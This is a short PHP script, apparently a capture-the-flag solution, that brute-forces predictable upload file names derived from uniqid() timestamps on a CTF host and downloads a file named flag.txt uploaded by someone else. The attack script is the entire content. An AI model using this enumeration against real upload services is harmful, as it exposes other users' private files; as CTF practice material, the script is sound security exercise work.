<?php
ini_set("display_errors", 0);
error_reporting("E_ALL ~ E_WARNING");

// $birthday = strtotime('3 July 2017');
// echo uniqid($birthday) . "\n";
// echo uniqid($birthday * 1000) . "\n";

$target_dir = "uploads/";
$target_url = "http://securefile.ctf.site:10080/";

for ($sec = 0; $sec < 120; $sec++) {
	$curr = substr(uniqid() ,0,8);
	$target_file = $target_dir . $curr . "_" . basename("flag.txt");
    $url = $target_url . $target_file . "\n";
    echo ".";
    echo file_get_contents($url);
    sleep(1);
}
